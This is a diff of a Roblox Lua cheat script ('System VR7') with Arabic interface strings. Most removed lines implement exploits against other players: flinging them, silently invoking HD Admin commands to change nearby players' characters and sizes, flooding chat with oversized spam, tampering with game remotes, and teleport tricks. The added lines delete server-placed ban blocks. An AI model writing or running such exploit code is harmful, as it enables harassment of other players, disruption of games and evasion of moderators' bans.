-                                                getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                                                getgenv().Cuff = {
-                                                    Bring = false,
-                                                    Throw = false
-                                                }
-                                                wait(1)
-                                            end
-                                            getgenv().Cuff = {
-                                                Bring = true,
-                                                Throw = false
-                                            }
-                                            Cuffbring()
-                                        end
-                                    else
-                                        game:GetService("StarterGui"):SetCore("SendNotification", {
-                                            Title = "System VR7",
-                                            Text = "\239\191\189\216\167\216\178\217\133 \217\138\217\131\217\136\217\134 \217\133\216\185\217\131 \217\131\217\132\216\168\216\180\216\169",
-                                            Duration = 5
-                                        })
-                                    end
-                                end)
-                                getgenv().RainbowTjm35.t2.MouseButton1Click:Connect(function()
-                                    pcall(function()
-                                        if vu41 ~= nil then
-                                            local v455 = GetCuff()
-                                            if not v455 then
-                                                SendNotify("System VR7", "\239\191\189\216\167\216\178\217\133 \217\138\217\131\217\136\217\134 \217\133\216\185\217\131 \217\131\217\132\216\168\216\180\216\169", 5)
-                                                return
-                                            end
-                                            if vu37[vu41].Character.UpperTorso.Anchored then
-                                                SendNotify("System VR7", "\239\191\189\217\132\216\167\216\185\216\168 \217\133\216\170\216\172\217\133\216\175 \216\167\217\136 \217\133\217\131\217\132\216\168\216\180 \216\168\217\132 \216\167\216\179\216\167\216\179", 5)
-                                                return
-                                            end
-                                            if v455 and v455.Parent == game.Players.LocalPlayer.Backpack then
-                                                v455.Parent = game.Players.LocalPlayer.Character
-                                            end
-                                            wait()
-                                            v455.RemoteEvent:FireServer(vu37[vu41].Character.HumanoidRootPart, "Cuff")
-                                            wait(0.2)
-                                            v455.RemoteEvent:FireServer(vu37[vu41].Character.HumanoidRootPart, "Cuff")
-                                        end
-                                    end)
-                                end)
-                                getgenv().RainbowTjm41.t2.MouseButton1Click:Connect(function()
-                                    ChangeToggleColor(getgenv().RainbowTjm41.t2)
-                                    if getgenv().RainbowTjm41.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                        while getgenv().RainbowTjm41.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                            if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
-                                                if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
-                                                    local v456 = 0
-                                                    repeat
-                                                        task.wait(0.3)
-                                                        v456 = v456 + 1
-                                                        Send("\239\191\189\216\167\217\138\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r.")
-                                                    until v456 >= 8
-                                                end
-                                                task.wait(0.5)
-                                            end
-                                        end
-                                    end
-                                end)
-                                getgenv().RainbowTjm36.t2.MouseButton1Click:Connect(function()
-                                    pcall(function()
-                                        if vu41 ~= nil then
-                                            local v457 = GetCuff()
-                                            if not v457 then
-                                                SendNotify("System VR7", "\239\191\189\216\167\216\178\217\133 \217\138\217\131\217\136\217\134 \217\133\216\185\217\131 \217\131\217\132\216\168\216\180\216\169", 5)
-                                                return
-                                            end
-                                            if vu37[vu41].Character.UpperTorso.Anchored then
-                                                SendNotify("System VR7", "\239\191\189\217\132\216\167\216\185\216\168 \217\133\216\170\216\172\217\133\216\175 \216\167\217\136 \217\133\217\131\217\132\216\168\216\180 \216\168\217\132 \216\167\216\179\216\167\216\179", 5)
-                                                return
-                                            end
-                                            if v457 and v457.Parent == game.Players.LocalPlayer.Backpack then
-                                                v457.Parent = game.Players.LocalPlayer.Character
-                                            end
-                                            v457.RemoteEvent:FireServer(vu37[vu41].Character.HumanoidRootPart, "Cuff")
-                                            wait(0.01)
-                                            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(Prefix .. "Char me 40")
-                                            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(Prefix .. "unchar")
-                                        end
-                                    end)
-                                end)
-                                getgenv().RainbowTjm37.t2.MouseButton1Click:Connect(function()
-                                    pcall(function()
-                                        local v458 = GetNearPlayers(game.Players.LocalPlayer, 15)
-                                        local v459, v460, v461 = pairs(v458)
-                                        while true do
-                                            local v462
-                                            v461, v462 = v459(v460, v461)
-                                            if v461 == nil then
-                                                break
-                                            end
-                                            task.wait()
-                                            local v463 = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HDAdminInterface").MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
-                                            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v463 .. "Char " .. v462.Name .. " Trifunelo1003")
-                                        end
-                                    end)
-                                end)
-                                getgenv().RainbowTjm38.t2.MouseButton1Click:Connect(function()
-                                    pcall(function()
-                                        local v464 = GetNearPlayers(game.Players.LocalPlayer, 15)
-                                        local v465, v466, v467 = pairs(v464)
-                                        while true do
-                                            local v468
-                                            v467, v468 = v465(v466, v467)
-                                            if v467 == nil then
-                                                break
-                                            end
-                                            task.wait()
-                                            local v469 = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HDAdminInterface").MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
-                                            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v469 .. "Size " .. v468.Name .. " 3")
-                                        end
-                                    end)
-                                end)
-                                getgenv().RainbowTjm40.t2.MouseButton1Click:Connect(function()
-                                    pcall(function()
-                                        local v470 = game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild("HDAdminInterface").MainFrame.Pages.Settings.Custom["AE1 Prefix"].SettingValue.TextBox.Text
-                                        game:GetService("ReplicatedStorage"):WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent"):InvokeServer(v470 .. "Char me Trifunelo1003")
-                                    end)
-                                end)
-                                LoadChatAlert()
-                            end
-                        else
-                            SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 10)
-                            getgenv().RainbowTjm3 = CreateButtonWithText(vu232, "Ball_Fling", "\239\191\189\217\132\217\134\217\130 \217\131\217\136\216\177\216\169", UDim2.new(0, 25, 0, 225), "\239\191\189\216\167\216\168 \216\167\217\132\217\133\216\175\216\177\216\179\216\169", 0)
-                            getgenv().RainbowTjm31 = CreateButtonWithText(vu232, "Teleport_To_Parkour", "\239\191\189\216\167\216\177\217\131\217\136\216\177", UDim2.new(0, 210, 0, 275), "\239\191\189\216\167\216\168 \216\167\217\132\217\133\216\175\216\177\216\179\216\169", 0)
-                            getgenv().RainbowTjm32 = CreateButtonWithText(vu232, "VehicleFling_Button", "\239\191\189\217\132\217\134\217\130 \216\175\216\177\216\167\216\172\216\169", UDim2.new(0, 210, 0, 225), "\239\191\189\216\167\216\168 \216\167\217\132\217\133\216\175\216\177\216\179\216\169", 0)
-                            getgenv().RainbowTjm33 = CreateButtonWithText(vu232, "Teleport_To_Secret", "\239\191\189\217\131\216\167\217\134 \216\179\216\177\217\138", UDim2.new(0, 25, 0, 275), "\239\191\189\216\167\216\168 \216\167\217\132\217\133\216\175\216\177\216\179\216\169", 0)
-                            getgenv().RainbowTjm3.t2.MouseButton1Click:Connect(function()
-                                ChangeToggleColor(getgenv().RainbowTjm3.t2)
-                                if getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                                    getgenv().loopfling = false
-                                else
-                                    getgenv().loopfling = true
-                                    if not getgenv().working then
-                                        if workspace.Football:FindFirstChild("Football") then
-                                            SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\216\174\216\170\217\129\216\170 \216\167\217\132\217\131\217\136\216\177\216\169 \216\179\217\136\217\129 \216\170\216\172\216\175\217\135\216\167 \217\129\217\138 \216\167\217\132\217\133\217\132\216\185\216\168", 5)
-                                            Flinger(workspace.Football.Football)
-                                        else
-                                            SendNotify("\239\191\189\216\183\216\167", "\239\191\189\216\176\216\177\216\167 \217\132\216\167\217\138\217\136\216\172\216\175 \217\131\217\136\216\177\216\169 \217\129\217\138 \216\167\217\132\216\179\217\138\216\177\217\129\216\177 \217\138\216\177\216\172\217\137 \216\170\216\186\217\138\217\138\216\177 \216\167\217\132\216\179\217\138\216\177\217\129\216\177", 5)
-                                        end
-                                    end
+
+
+                    
+                    local function observeHouse(houseInstance)
+                        pcall(function()
+                            local houseModel = houseInstance:WaitForChild("HousePickedByPlayer"):WaitForChild("HouseModel")
+                            houseModel.ChildAdded:Connect(function(child)
+                                if child.Name == "BannedBlock" and getgenv().antiHouseBan then
+                                    task.wait(0.1) 
+                                    child:Destroy()
+                                    Notify("حماية البيوت", "تم اكتشاف وحذف باند جديد من بيت: " .. houseInstance.Name, 2)
                                 end
                             end)
-                            getgenv().RainbowTjm32.t2.MouseButton1Click:Connect(function()
-                                ChangeToggleColor(getgenv().RainbowTjm32.t2)
-                                if getgenv().RainbowTjm32.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                    SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\167\216\176 \216\167\217\132\216\167\217\133\216\177 \217\138\216\183\217\138\216\177 \216\167\217\138 \216\180\216\174\216\181 \217\138\216\181\216\175\217\133 \216\168\216\175\216\177\216\167\216\172\216\170\217\131 \217\136\216\167\217\134\216\170 \216\170\216\179\217\136\217\130\217\135\216\167", 10)
-                                    local v471 = 0.1
-                                    while getgenv().RainbowTjm32.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                        task.wait()
-                                        game:GetService("RunService").Heartbeat:Wait()
-                                        local v472 = game.Players.LocalPlayer.Character
-                                        if v472 then
-                                            v472 = v472:FindFirstChild("HumanoidRootPart")
-                                        end
-                                        if v472 then
-                                            local v473 = v472.Velocity
-                                            v472.Velocity = v473 * 1000 + Vector3.new(0, 1000, 0)
-                                            game:GetService("RunService").RenderStepped:Wait()
-                                            v472.Velocity = v473
-                                            game:GetService("RunService").Stepped:Wait()
-                                            v472.Velocity = v473 + Vector3.new(0, v471, 0)
-                                            v471 = - v471
-                                        end
-                                        local v474, v475, v476 = ipairs(game.Players:GetPlayers())
-                                        while true do
-                                            local v477
-                                            v476, v477 = v474(v475, v476)
-                                            if v476 == nil then
-                                                break
-                                            end
-                                            if v477 ~= game.Players.LocalPlayer then
-                                                local v478, v479, v480 = ipairs(v477:GetChildren())
-                                                while true do
-                                                    local v481
-                                                    v480, v481 = v478(v479, v480)
-                                                    if v480 == nil then
-                                                        break
-                                                    end
-                                                    if v481:IsA("BasePart") then
-                                                        v481.CanCollide = false
-                                                    end
-                                                end
-                                            end
-                                        end
-                                    end
-                                end
-                            end)
-                            getgenv().RainbowTjm33.t2.MouseButton1Click:Connect(function()
-                                TeleportTO(162, - 89, 396, "pos", nil)
-                            end)
-                            getgenv().RainbowTjm31.t2.MouseButton1Click:Connect(function()
-                                TeleportTO(69, - 358, - 2326, "pos", nil)
-                            end)
-                            LoadChatAlert()
-                        end
-                    else
-                        SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 10)
-                        getgenv().RainbowTjm3 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\182\216\167\216\175 \216\177\216\167\217\130\216\175\217\136\217\132", UDim2.new(0, 25, 0, 225), "\239\191\189\216\167\216\168 \216\177\216\167\217\130\216\175\217\136\217\132", 0)
-                        getgenv().RainbowTjm31 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\217\129\216\172\217\138\216\177 \216\167\217\132\216\186\216\167\217\133", UDim2.new(0, 210, 0, 225), "\239\191\189\216\167\216\168 \216\177\216\167\217\130\216\175\217\136\217\132", 0)
-                        getgenv().RainbowTjm3.t2.MouseButton1Click:Connect(function()
-                            ChangeToggleColor(getgenv().RainbowTjm3.t2)
-                            if getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                SendNotify("System VR7", "\239\191\189\216\167\217\131\216\175 \216\167\217\134\217\131 \217\136\216\167\217\130\217\129 \217\130\216\168\217\132 \217\132\216\167\216\170\217\129\216\185\217\132\217\135", 5)
-                                while getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                    task.wait()
-                                    pcall(function()
-                                        if game.Players.LocalPlayer.Character["Local Ragdoll"].Enabled then
-                                            game.Players.LocalPlayer.Character["Local Ragdoll"].Enabled = false
-                                        end
-                                    end)
-                                end
-                                pcall(function()
-                                    game.Players.LocalPlayer.Character["Local Ragdoll"].Enabled = true
-                                end)
-                            end
-                        end)
-                        getgenv().RainbowTjm31.t2.MouseButton1Click:Connect(function()
-                            ChangeToggleColor(getgenv().RainbowTjm31.t2)
-                            if getgenv().RainbowTjm31.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                                SendNotify("System VR7", "\239\191\189\216\167\217\131\216\175 \216\167\217\134\217\131 \217\136\216\167\217\130\217\129 \217\130\216\168\217\132 \217\132\216\167\216\170\217\129\216\185\217\132\217\135", 5)
-                                while getgenv().RainbowTjm31.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                    task.wait()
-                                    pcall(function()
-                                        if game.Players.LocalPlayer.Character["Local Ragdoll"].Enabled then
-                                            game.Players.LocalPlayer.Character["Local Ragdoll"].Enabled = false
-                                        end
-                                    end)
-                                    local v482, v483, v484 = ipairs(workspace.Minefield.Mines:GetChildren())
-                                    while true do
-                                        local vu485
-                                        v484, vu485 = v482(v483, v484)
-                                        if v484 == nil then
-                                            break
-                                        end
-                                        wait()
-                                        pcall(function()
-                                            if vu485:IsA("Model") then
-                                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = vu485.WorldPivot
-                                            end
-                                        end)
-                                    end
-                                end
-                                pcall(function()
-                                    game.Players.LocalPlayer.Character["Local Ragdoll"].Enabled = true
-                                end)
-                            end
-                        end)
-                        LoadChatAlert()
-                    end
-                else
-                    SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 10)
-                    getgenv().RainbowTjm3 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\182\216\167\216\175 \216\177\216\167\217\130\216\175\217\136\217\132", UDim2.new(0, 25, 0, 225), "\239\191\189\216\167\216\168 \216\177\216\167\217\130\216\175\217\136\217\132", 0)
-                    getgenv().RainbowTjm31 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\217\129\216\172\217\138\216\177 \216\167\217\132\216\186\216\167\217\133", UDim2.new(0, 210, 0, 225), "\239\191\189\216\167\216\168 \216\177\216\167\217\130\216\175\217\136\217\132", 0)
-                    getgenv().RainbowTjm3.t2.MouseButton1Click:Connect(function()
-                        ChangeToggleColor(getgenv().RainbowTjm3.t2)
-                        if getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                            while getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                task.wait()
-                                pcall(function()
-                                    if game.Players.LocalPlayer.isRagdoll.Value then
-                                        game.Players.LocalPlayer.isRagdoll.Value = false
-                                        game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
-                                        game.Players.LocalPlayer.Character.Animate.Enabled = true
-                                    end
-                                    if game.Players.LocalPlayer.Character.Main.RagdollMe.Enabled then
-                                        game.Players.LocalPlayer.Character.Main.RagdollMe.Enabled = false
-                                    end
-                                end)
-                            end
-                            pcall(function()
-                                game.Players.LocalPlayer.Character.Main.RagdollMe.Enabled = true
-                            end)
-                        end
-                    end)
-                    getgenv().RainbowTjm31.t2.MouseButton1Click:Connect(function()
-                        ChangeToggleColor(getgenv().RainbowTjm31.t2)
-                        if getgenv().RainbowTjm31.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                            while getgenv().RainbowTjm31.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                                task.wait()
-                                pcall(function()
-                                    if game.Players.LocalPlayer.isRagdoll.Value then
-                                        game.Players.LocalPlayer.isRagdoll.Value = false
-                                        game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
-                                        game.Players.LocalPlayer.Character.Animate.Enabled = true
-                                    end
-                                end)
-                                local v486, v487, v488 = ipairs(workspace.MinefieldV2.Landmines.Mines:GetChildren())
-                                while true do
-                                    local vu489
-                                    v488, vu489 = v486(v487, v488)
-                                    if v488 == nil then
-                                        break
-                                    end
-                                    wait()
-                                    pcall(function()
-                                        if vu489:IsA("Model") then
-                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = vu489.WorldPivot
-                                        end
-                                    end)
-                                end
-                            end
-                        end
-                    end)
-                    LoadChatAlert()
-                end
-            else
-                getgenv().RainbowTjm3 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\185\217\132\217\138\217\130 \216\167\217\132\217\133\216\167\216\168", UDim2.new(0, 25, 0, 225), "\239\191\189\216\177\216\167\217\130 \217\135\217\136\216\168", 0)
-                SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 10)
-                getgenv().RainbowTjm3.t2.MouseButton1Click:Connect(function()
-                    ChangeToggleColor(getgenv().RainbowTjm3.t2)
-                    if getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                        while getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                            for _ = 1, 20 do
-                                task.wait()
-                                if getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(255, 0, 0) then
-                                    break
-                                end
-                                game:GetService("ReplicatedStorage"):WaitForChild("CustomChatEvent"):FireServer(string.rep("VR7 ", math.floor(49997.25)) .. string.sub("VR7 ", 1, 1))
-                            end
-                            task.wait(2.5)
-                        end
-                    end
-                end)
-                LoadChatAlert()
-            end
-        else
-            SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 10)
-            getgenv().RainbowTjm3 = CreateButtonWithText(v260, "Spam_Skins", "\239\191\189\216\185\216\183\216\167\216\161 \216\167\217\132\217\130\217\134\216\168\217\132\216\169", UDim2.new(0, 210, 0, 400), "\239\191\189\216\167\216\168 \216\167\217\132\217\130\217\134\216\168\217\132\216\169", 0)
-            getgenv().RainbowTjm35 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\182\216\167\216\175 \216\167\217\132\216\183\217\138\216\173\216\169", UDim2.new(0, 25, 0, 225), "\239\191\189\216\167\216\168 \216\167\217\132\217\130\217\134\216\168\217\132\216\169", 0)
-            getgenv().RainbowTjm33 = CreateButtonWithText(v260, "Spam_Skins", "\239\191\189\217\132\216\170\216\177\217\131\217\138\216\178 \216\185\217\132\217\138\217\135", UDim2.new(0, 25, 0, 450), "\239\191\189\216\167\216\168 \216\167\217\132\217\130\217\134\216\168\217\132\216\169", 0)
-            getgenv().RainbowTjm36 = CreateButtonWithText(vu232, "Spam_Skins", "\239\191\189\216\182\216\167\216\175 \217\130\217\134\216\168\217\132\216\169", UDim2.new(0, 210, 0, 225), "\239\191\189\216\167\216\168 \216\167\217\132\217\130\217\134\216\168\217\132\216\169", 0)
-            v260.CanvasSize = UDim2.new(0, 0, 1.5, 0)
-            getgenv().RainbowTjm3.t2.MouseButton1Click:Connect(function()
-                if vu41 ~= nil then
-                    ChangeToggleColor(getgenv().RainbowTjm3.t2)
-                    if getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                        SendNotify("System VR7", "\239\191\189\217\132\216\182\216\173\217\138\216\169 \217\138\216\172\216\168 \216\167\217\134 \216\170\217\131\217\136\217\134 \217\133\216\185\217\131 \216\168\217\132\217\130\217\138\217\133 \n \216\174\217\132\217\131 \217\130\216\177\217\138\216\168 \217\133\217\134 \216\167\217\132\216\182\216\173\217\138\216\169 \216\173\216\170\216\167 \217\138\216\182\216\168\216\183 \216\167\217\131\216\171\216\177", 5)
-                        while getgenv().RainbowTjm3.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                            task.wait()
-                            pcall(function()
-                                local v490 = GetBomb(game.Players.LocalPlayer)
-                                if v490 then
-                                    local v491 = v490:FindFirstChild("TimeLeft", true)
-                                    if tonumber(v491.Text) <= 2 then
-                                        wait(0.3)
-                                        local v492 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-                                        repeat
-                                            task.wait()
-                                            pcall(function()
-                                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(vu37[vu41].Character.Torso.Position)
-                                            end)
-                                        until not GetBomb(game.Players.LocalPlayer)
-                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v492
-                                    end
-                                end
-                            end)
-                        end
-                    end
-                end
-            end)
-            getgenv().RainbowTjm36.t2.MouseButton1Click:Connect(function()
-                ChangeToggleColor(getgenv().RainbowTjm36.t2)
-                if getgenv().RainbowTjm36.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                    SendNotify("V R 7", "\239\191\189\217\132\216\167\217\133\216\177 \217\135\216\167\216\176 \217\133\216\167\216\185\217\132\217\138\217\135 \216\168\216\167\217\134\216\175 \216\167\217\132\216\167 \216\167\216\176\216\167 \216\170\217\133 \216\170\216\181\217\136\217\138\216\177\217\131 \217\138\216\185\216\170\216\168\216\177 \216\167\217\131\216\171\216\177 \216\167\217\133\216\177 \217\138\216\179\216\167\216\185\216\175\217\131 \217\136\217\133\216\167\216\185\217\132\217\138\217\135 \216\168\216\167\217\134\216\175", 5)
-                    SendNotify("V R 7", "\239\191\189\217\132\217\133\216\182\216\167\216\175 \217\138\216\180\216\170\216\186\217\132 \216\168\216\185\216\175 \217\133\216\167\216\170\217\129\216\185\217\132\217\135 \217\136\216\170\217\133\217\136\216\170 \216\177\216\167\216\173 \217\138\216\181\217\138\216\177 \216\167\217\132\216\185\216\175\217\136 \217\133\216\167\217\138\217\130\216\175\216\177 \217\138\216\185\216\183\217\138\217\131 \217\130\217\134\216\168\217\132\216\169", 7)
-                    SendNotify("V R 7", "\239\191\189\216\176\216\167 \216\181\216\167\216\177\216\170 \216\185\217\134\216\175\217\131 \217\130\217\134\216\168\217\132\216\169 \217\136\216\185\216\183\217\138\216\170\217\135\216\167 \217\132\217\132\216\185\216\175\217\136 \216\177\216\167\216\173 \217\138\217\130\216\175\216\177 \216\167\217\132\216\185\216\175\217\136 \217\138\216\177\216\172\216\185\217\135\216\167 \217\132\217\131", 9)
-                    while getgenv().RainbowTjm36.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                        pcall(function()
-                            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Bomb") or game.Players.LocalPlayer.Backpack:FindFirstChild("Bomb") and game:GetService("ReplicatedStorage").Remotes.CharacterReplicator:FindFirstChild("UpdteCFrame") then
-                                game:GetService("ReplicatedStorage").Remotes.CharacterReplicator.UpdteCFrame.Name = "UpdateCFrame"
-                            elseif game.Players.LocalPlayer.Character and (not game.Players.LocalPlayer.Character:FindFirstChild("Bomb") and (not game.Players.LocalPlayer.Backpack:FindFirstChild("Bomb") and game:GetService("ReplicatedStorage").Remotes.CharacterReplicator:FindFirstChild("UpdateCFrame"))) then
-                                task.wait()
-                                game:GetService("ReplicatedStorage").Remotes.CharacterReplicator.UpdateCFrame.Name = "UpdteCFrame"
-                                wait()
-                            end
-                        end)
-                        task.wait()
-                    end
-                    wait(0.001)
-                    if game:GetService("ReplicatedStorage").Remotes.CharacterReplicator:FindFirstChild("UpdteCFrame") then
-                        game:GetService("ReplicatedStorage").Remotes.CharacterReplicator.UpdteCFrame.Name = "UpdateCFrame"
-                    end
-                end
-            end)
-            getgenv().RainbowTjm33.t2.MouseButton1Click:Connect(function()
-                if vu41 ~= nil then
-                    ChangeToggleColor(getgenv().RainbowTjm33.t2)
-                    if getgenv().RainbowTjm32.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                        SendNotify("System VR7", "\239\191\189\216\172\216\168 \216\167\216\183\217\129\216\167\216\161 \217\133\216\182\216\167\216\175 \216\167\217\132\217\130\217\134\216\167\216\168\217\132 \216\167\217\136\217\132\216\167", 3)
-                        getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 = Color3.fromRGB(255, 0, 0)
-                        return
-                    end
-                    if getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) then
-                        while getgenv().RainbowTjm33.t2.Ticket_Asset.ImageColor3 == Color3.fromRGB(0, 255, 0) do
-                            task.wait()
-                            pcall(function()
-                                game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(game.Players.LocalPlayer.Character.PrimaryPart.Position, Vector3.new(vu37[vu41].Character.HumanoidRootPart.Position.X, game.Players.LocalPlayer.Character.PrimaryPart.Position.Y, vu37[vu41].Character.HumanoidRootPart.Position.Z)))
-                            end)
-                        end
-                    end
-                end
-            end)
-            getgenv().RainbowTjm35.t2.MouseButton1Click:Connect(function()
-                ChangeToggleColor(getgenv().RainbowTjm35.t2)
-                if getgenv().RainbowTjm35.t2.Ticket_Asset.ImageColor3 ~= Color3.fromRGB(0, 255, 0) then
-                    pcall(function()
-                        game.workspace:FindFirstChild("AntiFall-Part"):Destroy()
-                    end)
-                else
-                    local v493 = Instance.new("Part", workspace)
-                    v493.Name = "AntiFall-Part"
-                    v493.Color = Color3.fromRGB(218, 133, 65)
-                    v493.Size = Vector3.new(61, 1, 62)
-                    v493.Anchored = true
-                    v493.CanCollide = true
-                    v493.Position = Vector3.new(42.99999237060547, 0.55, - 30)
-                    v493.Material = Enum.Material.Wood
-                end
-            end)
-            LoadChatAlert()
-        end
-    else
-        SendNotify("\239\191\189\217\132\216\167\216\173\216\184\216\169", "\239\191\189\216\176\216\167 \216\167\217\132\217\133\216\167\216\168 \217\133\216\175\216\185\217\136\217\133 \217\133\217\134 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\170\217\136\216\172\216\175 \217\133\217\138\216\178\216\167\216\170 \216\174\216\167\216\181\217\135 \216\168\217\132\217\133\216\167\216\168", 10)
-        getgenv().RainbowTjm32 = CreateButtonWithText(vu232, "VehicleFling_Button", "\239\191\189\217\132\217\134\217\130 \216\175\216\177\216\167\216\172\216\169", UDim2.new(0, 210, 0, 225), "\239\191\189\216\172\217\133\216\185 \216\167\217\132\216\185\216\177\216\168", 0)
-        getgenv().RainbowTjm35 = CreateButtonWithText(vu232, "Ball_Fling", "\239\191\189\217\132\217\134\217\130 \217\131\217\136\216\177\216\169", UDim2.new(0, 25, 0, 225), "\239\191\189\216\172\217\133\216\185 \216\167\217\132\216\185\216\177\216\168", 0)
-        getgenv().RainbowTjm32.t2.MouseButton1Click:Connect(function()
-            ChangeToggleColor(getgenv().RainbowTjm32.t2)
